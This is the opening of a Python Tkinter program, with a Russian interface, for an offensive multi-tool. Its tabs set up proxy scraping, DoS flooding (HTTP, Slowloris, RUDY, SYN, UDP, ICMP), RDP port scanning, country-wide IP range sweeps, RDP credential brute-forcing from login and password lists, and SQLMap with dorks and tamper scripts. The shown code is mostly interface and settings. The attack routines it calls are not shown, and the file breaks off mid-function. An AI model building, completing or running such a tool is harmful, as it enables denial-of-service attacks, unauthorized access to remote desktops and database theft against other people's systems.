import aiohttp
import asyncio
import requests
import re
import socket
import threading
import queue
import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import time
import logging
import random
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
import ipaddress
import paramiko
import json
import socks
import subprocess
import os
import csv
from datetime import datetime
from urllib.parse import urlparse, quote
from pathlib import Path
import glob
import shutil

# Логирование
logging.basicConfig(filename="proxy_scraper.log", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Константы для Proxy Scraper
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/14.1.1",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/89.0",
]
PROXY_SOURCES = [
    ("https://free-proxy-list.net/", "http"),
    ("https://www.sslproxies.org/", "https"),
    ("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http", "http"),
    ("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4", "socks4"),
    ("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5", "socks5"),
    ("https://www.proxy-list.download/api/v1/get?type=http", "http"),
    ("https://www.proxy-list.download/api/v1/get?type=socks4", "socks4"),
    ("https://www.proxy-list.download/api/v1/get?type=socks5", "socks5"),
    ("https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc", "http"),
    ("https://openproxylist.xyz/http.txt", "http"),
    ("https://openproxylist.xyz/socks4.txt", "socks4"),
    ("https://openproxylist.xyz/socks5.txt", "socks5"),
]
DANGEROUS_PORTS = {
    3389: {"name": "RDP", "risk": "Brute-force"},
    3390: {"name": "RDP-alt", "risk": "Brute-force"},
    3391: {"name": "RDP-alt", "risk": "Brute-force"},
    3392: {"name": "RDP-alt", "risk": "Brute-force"},
    3393: {"name": "RDP-alt", "risk": "Brute-force"},
}
TEST_URL = "http://httpbin.org/ip"
proxy_queue = queue.Queue()

# Константы для SQLMap
DESKTOP_PATH = str(Path.home() / "Desktop")
BG_COLOR = "#1C2526"
DARK_BG_COLOR = "#2E2E2E"  # Тёмный фон для Парсер прокси и Чекер
FG_COLOR = "#D9D9D9"
ENTRY_BG = "#2E3B3E"
BUTTON_BG = "#4A5A5D"
BUTTON_FG = "#FFFFFF"

class ProxyScraperApp:
    def get_tamper_scripts(self):
        tamper_dir = os.path.join(os.path.dirname(__file__), "sqlmap", "tamper")
        if os.path.exists(tamper_dir):
            return [f for f in os.listdir(tamper_dir) if f.endswith(".py") and f != "__init__.py"]
        return []

    def __init__(self, root):
        self.root = root
        self.root.title("Proxy Scraper & Tools")
        self.root.geometry("1200x800")
        self.root.configure(bg=BG_COLOR)
        self.is_running = False
        self.dos_running = False
        self.port_scan_running = False
        self.ip_range_running = False
        self.brute_running = False
        self.sqlmap_running = False
        self.proxy_check_running = False
        self.working_proxies = []
        self.checker_proxies = []
        self.proxy_type_selected = tk.StringVar(value="HTTP")  # Combobox для типа прокси
        self.check_proxy_type_selected = tk.StringVar(value="HTTP")  # Combobox для чекера
        self.threads_count = tk.IntVar(value=10)
        self.timeout = tk.DoubleVar(value=3.0)
        self.scraper_filter = tk.StringVar(value="Все")
        self.dos_threads = tk.IntVar(value=5)
        self.dos_requests = tk.IntVar(value=100)
        self.dos_rate_limit = tk.DoubleVar(value=10.0)
        self.dos_random_path = tk.BooleanVar(value=False)
        self.dos_custom_headers = tk.StringVar(value="{}")
        self.dos_attack_types = {
            "HTTP Flood": tk.BooleanVar(value=True),
            "Slowloris": tk.BooleanVar(value=False),
            "RUDY": tk.BooleanVar(value=False),
            "SYN Flood": tk.BooleanVar(value=False),
            "UDP Flood": tk.BooleanVar(value=False),
            "ICMP Flood": tk.BooleanVar(value=False),
        }
        self.target_url = tk.StringVar()
        self.port_scan_threads = tk.IntVar(value=10)
        self.port_scan_url = tk.StringVar()
        self.port_scan_custom = tk.StringVar()
        self.port_scan_use_proxy = tk.BooleanVar(value=False)
        self.port_selection = {port: tk.BooleanVar(value=True) for port in DANGEROUS_PORTS}
        self.port_scan_targets = []
        self.port_scan_results = []
        self.selected_country = tk.StringVar(value="Выберите страну")
        self.ip_range_threads = tk.IntVar(value=10)
        self.ip_range_custom_ports = tk.StringVar()
        self.ip_range_use_proxy = tk.BooleanVar(value=True)
        self.ip_ranges = []
        self.ip_range_results = []
        self.brute_threads = tk.IntVar(value=5)
        self.brute_targets = []
        self.brute_logins = []
        self.brute_passwords = []
        self.brute_results = []
        self.countries = [
            "Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Argentina", "Armenia", "Australia",
            "Austria", "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium",
            "Belize", "Benin", "Bhutan", "Bolivia", "Bosnia and Herzegovina", "Botswana", "Brazil",
            "Brunei", "Bulgaria", "Burkina Faso", "Burundi", "Cabo Verde", "Cambodia", "Cameroon",
            "Canada", "Central African Republic", "Chad", "Chile", "China", "Colombia", "Comoros",
            "Congo (Congo-Brazzaville)", "Costa Rica", "Croatia", "Cuba", "Cyprus", "Czech Republic",
            "Democratic Republic of the Congo", "Denmark", "Djibouti", "Dominica", "Dominican Republic",
            "Ecuador", "Egypt", "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Eswatini",
            "Ethiopia", "Fiji", "Finland", "France", "Gabon", "Gambia", "Georgia", "Germany", "Ghana",
            "Greece", "Grenada", "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", "Honduras",
            "Hungary", "Iceland", "India", "Indonesia", "Iran", "Iraq", "Ireland", "Israel", "Italy",
            "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Kuwait", "Kyrgyzstan",
            "Laos", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libya", "Liechtenstein", "Lithuania",
            "Luxembourg", "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands",
            "Mauritania", "Mauritius", "Mexico", "Micronesia", "Moldova", "Monaco", "Mongolia", "Montenegro",
            "Morocco", "Mozambique", "Myanmar", "Namibia", "Nauru", "Nepal", "Netherlands", "New Zealand",
            "Nicaragua", "Niger", "Nigeria", "North Korea", "North Macedonia", "Norway", "Oman", "Pakistan",
            "Palau", "Palestine", "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Poland",
            "Portugal", "Qatar", "Romania", "Russia", "Rwanda", "Saint Kitts and Nevis", "Saint Lucia",
            "Saint Vincent and the Grenadines", "Samoa", "San Marino", "Sao Tome and Principe", "Saudi Arabia",
            "Senegal", "Serbia", "Seychelles", "Sierra Leone", "Singapore", "Slovakia", "Slovenia",
            "Solomon Islands", "Somalia", "South Africa", "South Korea", "South Sudan", "Spain", "Sri Lanka",
            "Sudan", "Suriname", "Sweden", "Switzerland", "Syria", "Taiwan", "Tajikistan", "Tanzania",
            "Thailand", "Timor-Leste", "Togo", "Tonga", "Trinidad and Tobago", "Tunisia", "Turkey",
            "Turkmenistan", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom",
            "United States", "Uruguay", "Uzbekistan", "Vanuatu", "Vatican City", "Venezuela", "Vietnam",
            "Yemen", "Zambia", "Zimbabwe"
        ]
        self.countries.sort()

        # SQLMap Variables
        self.sqlmap_proxy_list = []
        self.sqlmap_valid_proxies = []
        self.sqlmap_sites = []
        self.sqlmap_vulnerable_urls = set()
        self.sqlmap_country_cache = {}
        self.sqlmap_found_databases = []
        self.sqlmap_tamper_scripts = self.get_tamper_scripts()
        self.sqlmap_progress_value = tk.DoubleVar()
        self.sqlmap_progress_label = tk.StringVar(value="0%")
        self.sqlmap_current_ip = tk.StringVar(value="Получение IP...")
        self.sqlmap_proxy_var_sqlmap = tk.BooleanVar()
        self.sqlmap_proxy_var_parser = tk.BooleanVar()
        self.sqlmap_proxy_var_check = tk.BooleanVar()
        self.sqlmap_selected_proxy_types = ["SOCKS4", "SOCKS5"]
        self.sqlmap_dorks_list = []  # Список дорков

        # Стили
        self.setup_styles()

        # Контекстное меню
        self.context_menu = tk.Menu(self.root, tearoff=0, bg=BG_COLOR, fg=FG_COLOR)
        self.context_menu.add_command(label="Копировать", command=self.copy_text)
        self.context_menu.add_command(label="Вставить", command=self.paste_text)

        # Вкладки
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(pady=5, padx=5, fill="both", expand=True)
        self.frames = {
            "scraper": tk.Frame(self.notebook, bg=DARK_BG_COLOR),  # Тёмный фон
            "checker": tk.Frame(self.notebook, bg=DARK_BG_COLOR),  # Тёмный фон
            "dos": tk.Frame(self.notebook, bg=BG_COLOR),
            "port_scan": tk.Frame(self.notebook, bg=BG_COLOR),
            "ip_range": tk.Frame(self.notebook, bg=BG_COLOR),
            "brute": tk.Frame(self.notebook, bg=BG_COLOR),
            "sqlmap": tk.Frame(self.notebook, bg=BG_COLOR),
        }
        for tab, title in [
            ("scraper", "Парсер прокси"), ("checker", "Чекер"), ("dos", "DoS"),
            ("port_scan", "Порты"), ("ip_range", "Сканер диапазонов"), ("brute", "Брут дедиков"), ("sqlmap", "SQLMap")
        ]:
            self.notebook.add(self.frames[tab], text=title)
            tk.Label(self.frames[tab], text=title, font=("Arial", 14, "bold"), bg=self.frames[tab]["bg"], fg=FG_COLOR).pack(pady=10)

        # Интерфейс
        self.setup_scraper_ui()
        self.setup_checker_ui()
        self.setup_dos_ui()
        self.setup_port_scan_ui()
        self.setup_ip_range_ui()
        self.setup_brute_ui()
        self.setup_sqlmap_ui()
    def setup_styles(self):
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TNotebook", background=BG_COLOR, borderwidth=0)
        style.configure("TNotebook.Tab", background=BUTTON_BG, foreground=BUTTON_FG, padding=[10, 5], font=("Arial", 10))
        style.map("TNotebook.Tab", background=[("selected", "#2E3B3E")], foreground=[("selected", "#00FF00")])
        style.configure("TFrame", background=BG_COLOR)
        style.configure("TLabel", background=BG_COLOR, foreground=FG_COLOR, font=("Arial", 10))
        style.configure("TButton", background=BUTTON_BG, foreground=BUTTON_FG, font=("Arial", 10))
        style.map("TButton", background=[("active", "#5A6A6D")], foreground=[("active", "#FFFFFF")])
        style.configure("TEntry", fieldbackground=ENTRY_BG, foreground=FG_COLOR, font=("Arial", 10))
        style.configure("TCombobox", fieldbackground=ENTRY_BG, background=BUTTON_BG, foreground=FG_COLOR, font=("Arial", 10))
        style.configure("green.Horizontal.TProgressbar", troughcolor=BG_COLOR, background="#00FF00", bordercolor=BG_COLOR)

    def copy_text(self):
        try:
            self.root.clipboard_clear()
            self.root.clipboard_append(self.root.focus_get().selection_get())
        except:
            pass

    def paste_text(self):
        try:
            self.root.focus_get().insert(tk.INSERT, self.root.clipboard_get())
        except:
            pass

    def setup_scraper_ui(self):
        frame = self.frames["scraper"]
        type_frame = tk.Frame(frame, bg=DARK_BG_COLOR)
        type_frame.pack()
        tk.Label(type_frame, text="Тип прокси:", bg=DARK_BG_COLOR, fg=FG_COLOR).pack(side="left", padx=5)
        ttk.Combobox(type_frame, textvariable=self.proxy_type_selected, values=["HTTP", "HTTPS", "SOCKS4", "SOCKS5"], state="readonly").pack(side="left")
        filter_frame = tk.Frame(frame, bg=DARK_BG_COLOR)
        filter_frame.pack()
        tk.Label(filter_frame, text="Фильтр:", bg=DARK_BG_COLOR, fg=FG_COLOR).pack(side="left", padx=5)
        ttk.Combobox(filter_frame, textvariable=self.scraper_filter, values=["Все", "Валиден", "Невалиден"], width=10).pack(side="left")
        tk.Label(filter_frame, text="Потоки:", bg=DARK_BG_COLOR, fg=FG_COLOR).pack(side="left", padx=5)
        ttk.Entry(filter_frame, textvariable=self.threads_count, width=5).pack(side="left")
        self.scraper_progress = ttk.Progressbar(frame, mode="determinate")
        self.scraper_progress.pack(fill="x", padx=10, pady=5)
        self.scraper_status = tk.Label(frame, text="Готов", bg=DARK_BG_COLOR, fg=FG_COLOR)
        self.scraper_status.pack(pady=5)
        self.scraper_tree = ttk.Treeview(frame, columns=("Proxy", "Type", "Status", "Time"), show="headings", height=12)
        self.scraper_tree.heading("Proxy", text="IP:PORT")
        self.scraper_tree.heading("Type", text="Тип")
        self.scraper_tree.heading("Status", text="Статус")
        self.scraper_tree.heading("Time", text="Время")
        self.scraper_tree.column("Proxy", width=150)
        self.scraper_tree.column("Type", width=80)
        self.scraper_tree.column("Status", width=80)
        self.scraper_tree.column("Time", width=120)
        self.scraper_tree.pack(fill="both", expand=True, padx=10, pady=5)
        self.scraper_tree.bind("<Button-3>", lambda e: self.context_menu.post(e.x_root, e.y_root))
        btn_frame = tk.Frame(frame, bg=DARK_BG_COLOR)
        btn_frame.pack(pady=10)
        self.scraper_start_btn = ttk.Button(btn_frame, text="Старт", command=self.start_scraping)
        self.scraper_start_btn.pack(side="left", padx=5)
        self.scraper_stop_btn = ttk.Button(btn_frame, text="Стоп", command=self.stop_scraping, state="disabled")
        self.scraper_stop_btn.pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Экспорт", command=self.save_proxies).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Очистить", command=self.clear_proxies).pack(side="left", padx=5)

    def setup_checker_ui(self):
        frame = self.frames["checker"]
        type_frame = tk.Frame(frame, bg=DARK_BG_COLOR)
        type_frame.pack()
        tk.Label(type_frame, text="Тип прокси:", bg=DARK_BG_COLOR, fg=FG_COLOR).pack(side="left", padx=5)
        ttk.Combobox(type_frame, textvariable=self.check_proxy_type_selected, values=["HTTP", "HTTPS", "SOCKS4", "SOCKS5"], state="readonly").pack(side="left")
        settings_frame = tk.Frame(frame, bg=DARK_BG_COLOR)
        settings_frame.pack()
        tk.Label(settings_frame, text="Таймаут:", bg=DARK_BG_COLOR, fg=FG_COLOR).pack(side="left", padx=5)
        ttk.Entry(settings_frame, textvariable=self.timeout, width=5).pack(side="left")
        tk.Label(settings_frame, text="Потоки:", bg=DARK_BG_COLOR, fg=FG_COLOR).pack(side="left", padx=5)
        ttk.Entry(settings_frame, textvariable=self.threads_count, width=5).pack(side="left")
        self.checker_progress = ttk.Progressbar(frame, mode="determinate")
        self.checker_progress.pack(fill="x", padx=10, pady=5)
        self.checker_status = tk.Label(frame, text="Готов", bg=DARK_BG_COLOR, fg=FG_COLOR)
        self.checker_status.pack(pady=5)
        self.checker_tree = ttk.Treeview(frame, columns=("Proxy", "Type", "Status", "Time"), show="headings", height=12)
        self.checker_tree.heading("Proxy", text="IP:PORT")
        self.checker_tree.heading("Type", text="Тип")
        self.checker_tree.heading("Status", text="Статус")
        self.checker_tree.heading("Time", text="Время")
        self.checker_tree.column("Proxy", width=150)
        self.checker_tree.column("Type", width=80)
        self.checker_tree.column("Status", width=80)
        self.checker_tree.column("Time", width=120)
        self.checker_tree.pack(fill="both", expand=True, padx=10, pady=5)
        self.checker_tree.bind("<Button-3>", lambda e: self.context_menu.post(e.x_root, e.y_root))
        btn_frame = tk.Frame(frame, bg=DARK_BG_COLOR)
        btn_frame.pack(pady=10)
        self.checker_start_btn = ttk.Button(btn_frame, text="Старт", command=self.start_checking)
        self.checker_start_btn.pack(side="left", padx=5)
        self.checker_stop_btn = ttk.Button(btn_frame, text="Стоп", command=self.stop_checking, state="disabled")
        self.checker_stop_btn.pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Экспорт", command=self.save_proxies).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Загрузить", command=self.load_proxies).pack(side="left", padx=5)

    def setup_dos_ui(self):
        frame = self.frames["dos"]
        target_frame = tk.Frame(frame, bg=BG_COLOR)
        target_frame.pack()
        tk.Label(target_frame, text="Цель:", bg=BG_COLOR, fg=FG_COLOR).pack(side="left")
        ttk.Entry(target_frame, textvariable=self.target_url, width=40).pack(side="left", padx=5)
        proxy_frame = tk.Frame(frame, bg=BG_COLOR)
        proxy_frame.pack(pady=5)
        tk.Label(proxy_frame, text="Типы прокси:", bg=BG_COLOR, fg=FG_COLOR).pack(side="left", padx=5)
        self.dos_proxy_types = {ptype: tk.BooleanVar(value=True) for ptype in ["HTTP", "HTTPS", "SOCKS4", "SOCKS5"]}
        for ptype in self.dos_proxy_types:
            tk.Checkbutton(proxy_frame, text=ptype, variable=self.dos_proxy_types[ptype], bg=BG_COLOR, fg=FG_COLOR, selectcolor=ENTRY_BG).pack(side="left", padx=5)
        tk.Label(proxy_frame, text="Прокси:", bg=BG_COLOR, fg=FG_COLOR).pack(side="left", padx=5)
        self.dos_proxy_listbox = tk.Listbox(proxy_frame, width=30, height=5, bg=ENTRY_BG, fg=FG_COLOR)
        self.dos_proxy_listbox.pack(side="left", padx=5)
        self.dos_proxy_listbox.bind("<<ListboxSelect>>", self.update_dos_selected_proxies)
        ttk.Button(proxy_frame, text="Обновить", command=self.refresh_dos_proxies).pack(side="left", padx=5)
        attack_frame = tk.Frame(frame, bg=BG_COLOR)
        attack_frame.pack(fill="x", padx=100, anchor="center")
        attack_types_ordered = ["HTTP Flood", "Slowloris", "RUDY", "SYN Flood", "UDP Flood", "ICMP Flood"]
        for atype in attack_types_ordered:
            tk.Checkbutton(attack_frame, text=atype, variable=self.dos_attack_types[atype], bg=BG_COLOR, fg=FG_COLOR, selectcolor=ENTRY_BG).pack(side="left", padx=5)
        settings_frame = tk.Frame(frame, bg=BG_COLOR)
        settings_frame.pack(pady=5)
        tk.Label(settings_frame, text="Потоки:", bg=BG_COLOR, fg=FG_COLOR).pack(side="left", padx=5)
        ttk.Entry(settings_frame, textvariable=self.dos_threads, width=5).pack(side="left")
        tk.Label(settings_frame, text="Запросы:", bg=BG_COLOR, fg=FG_COLOR).pack(side="left", padx=5)
        ttk.Entry(settings_frame, textvariable=self.dos_requests, width=5).pack(side="left")
        tk.Label(settings_frame, text="Скорость (зап/с):", bg=BG_COLOR, fg=FG_COLOR).pack(side="left", padx=5)
        ttk.Entry(settings_frame, textvariable=self.dos_rate_limit, width=5).pack(side="left")
        tk.Checkbutton(settings_frame, text="Случайные пути", variable=self.dos_random_path, bg=BG_COLOR, fg=FG_COLOR, selectcolor=ENTRY_BG).pack(side="left", padx=5)
        tk.Label(frame, text="Заголовки (JSON):", bg=BG_COLOR, fg=FG_COLOR).pack()
        ttk.Entry(frame, textvariable=self.dos_custom_headers, width=40).pack(pady=5)
        self.dos_progress = ttk.Progressbar(frame, mode="determinate")
        self.dos_progress.pack(fill="x", padx=10, pady=5)
        self.dos_status = tk.Label(frame, text="Готов", bg=BG_COLOR, fg=FG_COLOR)
        self.dos_status.pack(pady=5)
        self.dos_log = tk.Text(frame, height=12, width=100, font=("Arial", 9), bg=ENTRY_BG, fg=FG_COLOR)
        self.dos_log.pack(pady=5)
        btn_frame = tk.Frame(frame, bg=BG_COLOR)
        btn_frame.pack(pady=10)
        self.dos_start_btn = ttk.Button(btn_frame, text="Старт", command=self.start_dos)
        self.dos_start_btn.pack(side="left", padx=5)
        self.dos_stop_btn = ttk.Button(btn_frame, text="Стоп", command=self.stop_dos, state="disabled")
        self.dos_stop_btn.pack(side="left", padx=5)

    def setup_port_scan_ui(self):
        frame = self.frames["port_scan"]
        target_frame = tk.Frame(frame, bg=BG_COLOR)
        target_frame.pack()
        tk.Label(target_frame, text="Цель:", bg=BG_COLOR, fg=FG_COLOR).pack(side="left")
        ttk.Entry(target_frame, textvariable=self.port_scan_url, width=40).pack(side="left", padx=5)
        ttk.Button(target_frame, text="Загрузить из файла", command=self.load_port_scan_targets).pack(side="left", padx=5)
        settings_frame = tk.Frame(frame, bg=BG_COLOR)
        settings_frame.pack()
        tk.Label(settings_frame, text="Потоки:", bg=BG_COLOR, fg=FG_COLOR).pack(side="left", padx=5)
        ttk.Entry(settings_frame, textvariable=self.port_scan_threads, width=5).pack(side="left")
        tk.Label(settings_frame, text="Таймаут:", bg=BG_COLOR, fg=FG_COLOR).pack(side="left", padx=5)
        ttk.Entry(settings_frame, textvariable=self.timeout, width=5).pack(side="left")
        ports_frame = tk.Frame(frame, bg=BG_COLOR)
        ports_frame.pack(fill="x", padx=100, anchor="center")
        for port, info in sorted(DANGEROUS_PORTS.items()):
            tk.Checkbutton(ports_frame, text=f"{port} ({info['name']})", variable=self.port_selection[port], bg=BG_COLOR, fg=FG_COLOR, selectcolor=ENTRY_BG).pack(side="left", padx=5)
        tk.Label(frame, text="Свои порты (через запятую или диапазон):", bg=BG_COLOR, fg=FG_COLOR).pack()
        ttk.Entry(frame, textvariable=self.port_scan_custom, width=20).pack(pady=5)
        tk.Checkbutton(frame, text="Использовать прокси", variable=self.port_scan_use_proxy, bg=BG_COLOR, fg=FG_COLOR, selectcolor=ENTRY_BG).pack(pady=5)
        proxy_frame = tk.Frame(frame, bg=BG_COLOR)
        proxy_frame.pack(pady=5)
        tk.Label(proxy_frame, text="Типы прокси:", bg=BG_COLOR, fg=FG_COLOR).pack(side="left", padx=5)
        self.port_scan_proxy_types = {ptype: tk.BooleanVar(value=True) for ptype in ["HTTP", "HTTPS", "SOCKS4", "SOCKS5"]}
        for ptype in self.port_scan_proxy_types:
            tk.Checkbutton(proxy_frame, text=ptype, variable=self.port_scan_proxy_types[ptype], bg=BG_COLOR, fg=FG_COLOR, selectcolor=ENTRY_BG).pack(side="left", padx=5)
        tk.Label(proxy_frame, text="Прокси:", bg=BG_COLOR, fg=FG_COLOR).pack(side="left", padx=5)
        self.port_scan_proxy_listbox = tk.Listbox(proxy_frame, width=30, height=5, bg=ENTRY_BG, fg=FG_COLOR)
        self.port_scan_proxy_listbox.pack(side="left", padx=5)
        self.port_scan_proxy_listbox.bind("<<ListboxSelect>>", self.update_port_scan_selected_proxies)
        ttk.Button(proxy_frame, text="Обновить", command=self.refresh_port_scan_proxies).pack(side="left", padx=5)
        self.port_scan_progress = ttk.Progressbar(frame, mode="determinate")
        self.port_scan_progress.pack(fill="x", padx=10, pady=5)
        self.port_scan_status = tk.Label(frame, text="Готов", bg=BG_COLOR, fg=FG_COLOR)
        self.port_scan_status.pack(pady=5)
        self.port_scan_tree = ttk.Treeview(frame, columns=("IP", "Port", "Status", "Service", "Risk"), show="headings", height=10)
        self.port_scan_tree.heading("IP", text="IP")
        self.port_scan_tree.heading("Port", text="Порт")
        self.port_scan_tree.heading("Status", text="Статус")
        self.port_scan_tree.heading("Service", text="Сервис")
        self.port_scan_tree.heading("Risk", text="Риск")
        self.port_scan_tree.column("IP", width=120)
        self.port_scan_tree.column("Port", width=80)
        self.port_scan_tree.column("Status", width=80)
        self.port_scan_tree.column("Service", width=100)
        self.port_scan_tree.column("Risk", width=150)
        self.port_scan_tree.pack(fill="both", expand=True, padx=10, pady=5)
        self.port_scan_tree.bind("<Button-3>", lambda e: self.context_menu.post(e.x_root, e.y_root))
        btn_frame = tk.Frame(frame, bg=BG_COLOR)
        btn_frame.pack(pady=10)
        self.port_scan_start_btn = ttk.Button(btn_frame, text="Старт", command=self.start_port_scan)
        self.port_scan_start_btn.pack(side="left", padx=5)
        self.port_scan_stop_btn = ttk.Button(btn_frame, text="Стоп", command=self.stop_port_scan, state="disabled")
        self.port_scan_stop_btn.pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Сохранить", command=self.save_port_scan_results).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Очистить", command=self.clear_port_scan_results).pack(side="left", padx=5)

    def setup_ip_range_ui(self):
        frame = self.frames["ip_range"]
        tk.Label(frame, text="Внимание: сканирование чужих сетей без разрешения незаконно!", font=("Arial", 10, "italic"), bg=BG_COLOR, fg="#FF5555").pack(pady=5)
        country_frame = tk.Frame(frame, bg=BG_COLOR)
        country_frame.pack()
        tk.Label(country_frame, text="Страна:", bg=BG_COLOR, fg=FG_COLOR).pack(side="left")
        ttk.Combobox(country_frame, textvariable=self.selected_country, values=self.countries, state="readonly", width=30).pack(side="left", padx=5)
        ttk.Button(country_frame, text="Получить диапазоны", command=self.fetch_ip_ranges).pack(side="left", padx=5)
        tk.Label(frame, text="IP-диапазоны:", bg=BG_COLOR, fg=FG_COLOR).pack()
        self.country_ip_ranges = tk.Text(frame, height=5, width=50, bg=ENTRY_BG, fg=FG_COLOR)
        self.country_ip_ranges.pack(pady=5)
        settings_frame = tk.Frame(frame, bg=BG_COLOR)
        settings_frame.pack()
        tk.Label(settings_frame, text="Потоки:", bg=BG_COLOR, fg=FG_COLOR).pack(side="left", padx=5)
        ttk.Entry(settings_frame, textvariable=self.ip_range_threads, width=5).pack(side="left")
        tk.Label(frame, text="Порты:", bg=BG_COLOR, fg=FG_COLOR).pack()
        ports_frame = tk.Frame(frame, bg=BG_COLOR)
        ports_frame.pack(fill="x")
        for port in [3390, 3391, 3392, 3393]:
            tk.Checkbutton(ports_frame, text=f"{port}", variable=self.port_selection[port], bg=BG_COLOR, fg=FG_COLOR, selectcolor=ENTRY_BG).pack(side="left", padx=5)
        tk.Label(frame, text="Свои порты (через запятую):", bg=BG_COLOR, fg=FG_COLOR).pack()
        ttk.Entry(frame, textvariable=self.ip_range_custom_ports, width=20).pack(pady=5)
        tk.Checkbutton(frame, text="Сканировать через прокси", variable=self.ip_range_use_proxy, bg=BG_COLOR, fg=FG_COLOR, selectcolor=ENTRY_BG).pack(pady=5)
        proxy_frame = tk.Frame(frame, bg=BG_COLOR)
        proxy_frame.pack(pady=5)
        tk.Label(proxy_frame, text="Типы прокси:", bg=BG_COLOR, fg=FG_COLOR).pack(side="left", padx=5)
        self.ip_range_proxy_types = {ptype: tk.BooleanVar(value=True) for ptype in ["HTTP", "HTTPS", "SOCKS4", "SOCKS5"]}
        for ptype in self.ip_range_proxy_types:
            tk.Checkbutton(proxy_frame, text=ptype, variable=self.ip_range_proxy_types[ptype], bg=BG_COLOR, fg=FG_COLOR, selectcolor=ENTRY_BG).pack(side="left", padx=5)
        tk.Label(proxy_frame, text="Прокси:", bg=BG_COLOR, fg=FG_COLOR).pack(side="left", padx=5)
        self.ip_range_proxy_listbox = tk.Listbox(proxy_frame, width=30, height=5, bg=ENTRY_BG, fg=FG_COLOR)
        self.ip_range_proxy_listbox.pack(side="left", padx=5)
        self.ip_range_proxy_listbox.bind("<<ListboxSelect>>", self.update_ip_range_selected_proxies)
        ttk.Button(proxy_frame, text="Обновить", command=self.refresh_ip_range_proxies).pack(side="left", padx=5)
        self.ip_range_progress = ttk.Progressbar(frame, mode="determinate")
        self.ip_range_progress.pack(fill="x", padx=10, pady=5)
        self.ip_range_status = tk.Label(frame, text="Готов", bg=BG_COLOR, fg=FG_COLOR)
        self.ip_range_status.pack(pady=5)
        self.ip_range_tree = ttk.Treeview(frame, columns=("IP", "Port"), show="headings", height=10)
        self.ip_range_tree.heading("IP", text="IP")
        self.ip_range_tree.heading("Port", text="Порт")
        self.ip_range_tree.column("IP", width=150)
        self.ip_range_tree.column("Port", width=80)
        self.ip_range_tree.pack(fill="both", expand=True, padx=10, pady=5)
        self.ip_range_tree.bind("<Button-3>", lambda e: self.context_menu.post(e.x_root, e.y_root))
        btn_frame = tk.Frame(frame, bg=BG_COLOR)
        btn_frame.pack(pady=10)
        self.ip_range_start_btn = ttk.Button(btn_frame, text="Старт", command=self.start_ip_range_scan)
        self.ip_range_start_btn.pack(side="left", padx=5)
        self.ip_range_stop_btn = ttk.Button(btn_frame, text="Стоп", command=self.stop_ip_range_scan, state="disabled")
        self.ip_range_stop_btn.pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Экспорт", command=self.save_ip_range_results).pack(side="left", padx=5)

    def setup_brute_ui(self):
        frame = self.frames["brute"]
        tk.Label(frame, text="Внимание: несанкционированный брутфорс незаконен!", font=("Arial", 10, "italic"), bg=BG_COLOR, fg="#FF5555").pack(pady=5)
        settings_frame = tk.Frame(frame, bg=BG_COLOR)
        settings_frame.pack()
        tk.Label(settings_frame, text="Потоки:", bg=BG_COLOR, fg=FG_COLOR).pack(side="left", padx=5)
        ttk.Entry(settings_frame, textvariable=self.brute_threads, width=5).pack(side="left")
        tk.Label(settings_frame, text="Таймаут:", bg=BG_COLOR, fg=FG_COLOR).pack(side="left", padx=5)
        ttk.Entry(settings_frame, textvariable=self.timeout, width=5).pack(side="left")
        load_frame = tk.Frame(frame, bg=BG_COLOR)
        load_frame.pack(pady=5)
        ttk.Button(load_frame, text="Загрузить IP", command=self.load_brute_targets).pack(side="left", padx=5)
        ttk.Button(load_frame, text="Загрузить логины", command=self.load_brute_logins).pack(side="left", padx=5)
        ttk.Button(load_frame, text="Загрузить пароли", command=self.load_brute_passwords).pack(side="left", padx=5)
        self.brute_progress = ttk.Progressbar(frame, mode="determinate")
        self.brute_progress.pack(fill="x", padx=10, pady=5)
        self.brute_status = tk.Label(frame, text="Готов", bg=BG_COLOR, fg=FG_COLOR)
        self.brute_status.pack(pady=5)
        self.brute_tree = ttk.Treeview(frame, columns=("IP", "Port", "Login", "Password", "Status"), show="headings", height=8)
        self.brute_tree.heading("IP", text="IP")
        self.brute_tree.heading("Port", text="Порт")
        self.brute_tree.heading("Login", text="Логин")
        self.brute_tree.heading("Password", text="Пароль")
        self.brute_tree.heading("Status", text="Статус")
        self.brute_tree.column("IP", width=120)
        self.brute_tree.column("Port", width=80)
        self.brute_tree.column("Login", width=100)
        self.brute_tree.column("Password", width=100)
        self.brute_tree.column("Status", width=100)
        self.brute_tree.pack(fill="both", padx=10, pady=5)
        self.brute_tree.bind("<Button-3>", lambda e: self.context_menu.post(e.x_root, e.y_root))
        self.brute_log = tk.Text(frame, height=5, width=80, font=("Arial", 9), bg=ENTRY_BG, fg=FG_COLOR)
        self.brute_log.pack(pady=5)
        btn_frame = tk.Frame(frame, bg=BG_COLOR)
        btn_frame.pack(pady=10)
        self.brute_start_btn = ttk.Button(btn_frame, text="Старт", command=self.start_brute)
        self.brute_start_btn.pack(side="left", padx=5)
